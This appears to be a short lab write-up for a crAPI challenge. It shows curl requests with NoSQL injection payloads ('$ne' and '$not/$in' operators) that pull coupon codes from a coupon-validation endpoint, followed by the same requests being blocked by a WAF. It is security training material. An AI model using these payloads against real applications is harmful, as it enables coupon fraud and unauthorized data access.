 Find a way to get free coupons without knowing the coupon code.
 We initiated the challenge by intercepting the validate-coupon request in postman.

![[Pasted image 20260831151440.png|913]]
![[Pasted image 20260831151530.png|919]]


we can use “NoSQL” injection
```zsh unfold ln:false unwrap title:"code"
curl -X POST  http://10.1.10.104/community/api/v2/coupon/validate-coupon -d '{"coupon_code":{"$ne": null}}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260831151904.png]]

we received an coupon `TRAC075`

```zsh unfold ln:false unwrap title:"code"
curl -X POST  http://10.1.10.104/community/api/v2/coupon/validate-coupon -d '{"coupon_code":{"$not": {"$in":["TRAC075"]}}}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260901083326.png]]
another coupon `TRAC065`
## Validation WAF Protection 

```zsh unfold ln:false unwrap title:"code"
curl -X POST  http://crapi.local/community/api/v2/coupon/validate-coupon -d '{"coupon_code":{"$ne": null}}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```

```zsh unfold ln:false unwrap title:"code"
curl -X POST  http://crapi.local/community/api/v2/coupon/validate-coupon -d '{"coupon_code":{"$not": {"$in":["TRAC075"]}}}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```

![[Pasted image 20260901092113.png]]
same requests blocked by WAF